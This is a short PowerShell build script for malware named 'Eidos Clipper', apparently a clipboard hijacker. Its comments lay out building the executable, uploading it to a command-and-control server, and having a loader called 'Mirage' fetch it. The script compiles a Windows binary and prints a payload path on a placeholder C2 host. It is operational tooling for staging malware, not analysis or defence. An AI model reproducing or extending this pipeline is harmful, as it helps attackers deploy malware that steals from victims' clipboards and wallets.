# Eidos Clipper Deployment
# Run this on the build machine to:
# 1. Build Clipper
# 2. Upload to C2 server
# 3. Configure Mirage to download it

param(
    [string]$C2Url = "https://your-c2.com",
    [string]$OutputDir = "./build"
)

Write-Host "=== Eidos Clipper Build ===" -ForegroundColor Cyan

# Build
Set-Location clipper
zig build -Dtarget=x86_64-windows
if ($LASTEXITCODE -ne 0) { Write-Host "Build failed!" -ForegroundColor Red; exit 1 }

# Copy output
Copy-Item "zig-out\bin\EidosClipper.exe" "$OutputDir\"

Write-Host "[DONE] EidosClipper.exe ready for deployment" -ForegroundColor Green
Write-Host "Upload to: $C2Url/payloads/clipper.exe"
